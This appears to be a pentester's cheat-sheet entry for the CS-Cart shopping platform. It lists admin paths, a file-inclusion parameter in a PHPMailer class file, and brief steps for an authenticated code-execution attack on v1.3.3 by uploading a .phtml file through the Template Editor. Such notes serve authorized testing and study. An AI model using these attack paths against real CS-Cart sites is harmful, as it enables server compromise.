# CS Cart

## Interesting Paths

```bash
# version
/admin.php?version

# login page
/admin.php
```

## LFI / RFI

```bash
/classes/phpmailer/class.cs_phpmailer.php?classes_dir=<>
```

## v1.3.3 RCE (Authenticated)

* https://www.exploit-db.com/exploits/48891

```bash
# upload .phtml under Template Editor
# invoke at /skins/FILE.phtml
```